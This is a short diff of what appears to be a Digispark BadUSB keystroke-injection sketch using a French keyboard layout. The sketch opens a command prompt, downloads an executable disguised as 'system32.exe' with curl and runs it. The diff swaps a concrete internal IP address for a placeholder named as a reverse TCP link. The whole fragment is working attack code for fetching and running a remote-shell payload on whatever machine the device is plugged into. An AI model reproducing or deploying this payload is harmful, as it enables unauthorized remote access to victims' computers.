@@ -25,7 +25,7 @@ void setup() {
   DigiKeyboardFr.print("cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboardFr.print("curl http://172.30.214.233:8080/system32.exe -o system32.exe");
+  DigiKeyboardFr.print("curl lien_du_reverse_tcp -o system32.exe");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1500);
   DigiKeyboardFr.print("system32.exe");
